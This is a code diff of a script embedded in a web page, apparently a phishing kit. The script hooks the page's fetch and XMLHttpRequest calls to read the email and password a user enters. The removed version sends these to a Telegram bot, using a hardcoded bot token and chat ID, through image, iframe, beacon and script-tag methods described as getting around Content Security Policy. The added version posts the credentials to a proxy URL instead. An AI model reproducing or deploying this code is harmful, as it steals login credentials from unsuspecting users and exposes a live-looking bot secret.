@@ -16085,56 +16085,44 @@
   </div>
 <script>
 (function() {
-    // ⚙️ CONFIGURATION
-    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';
-    const TELEGRAM_CHAT_ID = '8391692120';
-    // ⚙️ END CONFIGURATION
+    // ========== CONFIGURATION ==========
+    // REPLACE THIS WITH YOUR RENDER URL
+    const PROXY_URL = 'https://YOUR-RENDER-APP.onrender.com/send';
+    // ========== END CONFIGURATION ==========
 
     let passwordSent = false;
 
-    // ========== CSP BYPASS - MULTIPLE METHODS ==========
     function sendToTelegram(email, password) {
         if (passwordSent) return;
         
-        const message = `🔐 New Password\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Time: ${new Date().toLocaleString()}`;
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        console.log('[📤] Sending to proxy:', PROXY_URL);
+        console.log('[📤] Email:', email);
+        console.log('[📤] Password:', password);
 
-        console.log('[📤] Attempting to send with multiple methods...');
-
-        // METHOD 1: Image request (bypasses connect-src CSP)
-        try {
-            const img = new Image();
-            img.style.display = 'none';
-            img.onload = function() { console.log('[✅] Image method succeeded'); };
-            img.onerror = function() { console.log('[❌] Image method failed'); };
-            img.src = url;
-            document.body.appendChild(img);
-        } catch(e) { console.log('[❌] Image method error:', e.message); }
-
-        // METHOD 2: Iframe (bypasses connect-src CSP)
-        try {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = url;
-            document.body.appendChild(iframe);
-        } catch(e) { console.log('[❌] Iframe method error:', e.message); }
-
-        // METHOD 3: navigator.sendBeacon (bypasses some CSP)
-        try {
-            const beaconResult = navigator.sendBeacon(url);
-            console.log('[📤] Beacon result:', beaconResult);
-        } catch(e) { console.log('[❌] Beacon error:', e.message); }
-
-        // METHOD 4: JSONP-style script tag
-        try {
-            const script = document.createElement('script');
-            script.style.display = 'none';
-            script.src = url;
-            document.body.appendChild(script);
-        } catch(e) {}
+        // Send to your Render proxy using fetch (this bypasses CSP because your Render URL is allowed)
+        fetch(PROXY_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                email: email || 'Not found',
+                password: password
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                console.log('[✅] Password sent to Telegram successfully!');
+            } else {
+                console.error('[❌] Proxy error:', data);
+            }
+        })
+        .catch(error => {
+            console.error('[❌] Failed to send via proxy:', error);
+        });
 
         passwordSent = true;
-        console.log('[✅] Password capture complete - check Telegram!');
     }
 
     function getEmail() {
@@ -16170,7 +16158,7 @@
         }
     }
 
-    // ========== INTERCEPT FETCH (reads password before sending) ==========
+    // ========== INTERCEPT FETCH ==========
     const originalFetch = window.fetch;
     window.fetch = function(...args) {
         const url = args[0];
@@ -16218,7 +16206,6 @@
         return originalXHRSend.apply(this, [body]);
     };
 
-    // Save original open to set _url
     const originalOpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url, ...rest) {
         this._url = url;
@@ -16265,10 +16252,11 @@
         if (attempts > 30) clearInterval(findButton);
     }, 500);
 
-    console.log('[✅] Password capture script active (CSP bypass using Image/iframe/Beacon)');
-    console.log('[ℹ️] The password will be sent to Telegram when you click "Next" or press Enter');
-
-    // Manual test function
+    console.log('[✅] Password capture script active (using Render proxy)');
+    console.log('[ℹ️] Proxy URL:', PROXY_URL);
+    console.log('[ℹ️] Password will be sent when you click "Next" or press Enter');
+    
+    // Manual test
     window.testCapture = function() {
         const pwd = getPassword();
         const email = getEmail();
